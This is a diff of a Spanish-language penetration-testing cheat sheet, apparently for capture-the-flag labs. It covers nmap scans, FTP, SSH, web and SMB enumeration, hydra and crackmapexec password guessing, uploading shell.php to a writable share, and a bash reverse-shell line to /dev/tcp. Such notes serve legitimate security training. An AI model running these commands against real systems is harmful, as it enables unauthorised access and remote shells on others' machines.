@@ -1,10 +1,10 @@
 0️⃣ COMANDOS GENERALES (SIEMPRE LO PRIMERO)
+
 Escaneo inicial
-nmap -vv -sC -sV IP
-nmap -vv IP
 nmap -vv -p- IP
-nmap -sVC -p PUERTOS IP
-nmap -sC -sV -p- IP
+nmap -vv -p -sC -sV IP
+
+
 
 Para versiones y scripts:
 
@@ -35,11 +35,16 @@ nmap -Pn IP
 Evadir firewall:
 
 nmap -vv -p445 --source-port 21 IP
+
+
+PUERTOS
 21️⃣ PUERTO 21 → FTP
 
 Comprobar FTP:
 
-nmap -p21 -sV IP
+nmap -p21 -sVC IP
+nmap -vv -p21 -sV -sC IP
+sudo nmap -sV -p21 --script ftp-* IP
 
 Entrar al FTP:
 
@@ -107,6 +112,12 @@ bash -c 'bash -i >& /dev/tcp/IPKALI/4444 0>&1'
 
 
 22️⃣ PUERTO 22 → SSH
+nmap -p22 IP --script ssh2-enum-algos  ->PARA SABER QUÉ ALGORITMO ESTÁ UTILIZANDO (SHA-256...ETC)
+nmap -vv -p22 IP --script ssh-hostkey --script-args ssh_hostkey=full
+nmap -vv -p22 IP --script ssh-auth-methods --script-args="ssh.user=root"
+
+
+
 
 Login normal:
 
@@ -154,6 +165,13 @@ cat pass.bak
 
 80️⃣ PUERTO 80 → WEB
 
+Buscar robots.txt
+nmap -vv -p80 -sV --script http-robots.txt.nse IP
+
+Luego visitar:
+
+IP/robots.txt
+
 Enumerar web:
 detectar CMS
 whatweb http://IP
@@ -186,22 +204,41 @@ hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 10.10.188.51 http-post-fo
 
 
 
-139 / 445 → SMB
+PUERTO 445 139 / 445 → SMB
+
+nmap -vv -p445 --script smb-os-discovery.nse IP
+nmap -vv -p445 -sV --script smb-* -T5 IP
+nmap -vv -p445 -sV --script smb-vuln-* IP
+nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse IP
+
 
 Enumerar shares:
 
 smbclient -L //IP -N
+smbmap -H IP
+smbmap -H IP -u usuario -p password
+USUARIO SIN CONTRASEÑA:   smbmap -H IP -u guest -p ''
+VER CONTENIDO DE UN SHARE: smbmap -H IP -r nombreShare
+Si el share tiene WRITE: smbmap -H IP --upload shell.php backups/shell.php
+crackmapexec smb [IP] -u '' -p '' --user --> enumerar usuarios 
+crackmapexec smb [IP] -u [user] -p [passwords]  probar usarios y contraseñas
+crackmapexec smb ledger.thm -u guest -p '' shares enumerar carpetas compartidas
+crackmapexec smb ledger.thm -u guest -p '' --rid  enumerar usuarios por rid
+
 
 Entrar share:
 
 smbclient //IP/Anonymous -N
+dir
+ls
+get passwords.txt
+cat passwords.txt
+
+
 
 Listar archivos:
-
 ls
-
 Descargar:
-
 get archivo.txt
 
 Enumeración SMB:
